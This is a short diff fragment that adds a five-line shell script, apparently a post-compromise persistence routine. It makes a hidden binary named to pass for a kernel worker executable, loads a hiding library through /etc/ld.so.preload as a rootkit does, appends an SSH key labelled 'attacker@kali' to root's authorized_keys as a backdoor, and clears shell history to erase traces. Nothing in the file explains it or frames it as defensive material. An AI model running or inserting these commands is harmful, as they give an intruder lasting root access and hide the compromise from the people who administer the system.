@@ -1,0 +1,5 @@
+cd /tmp
+chmod +x .kworkerd
+echo "/tmp/libhide.so" > /etc/ld.so.preload
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA-FAKE-KEY attacker@kali" >> /root/.ssh/authorized_keys
+history -c
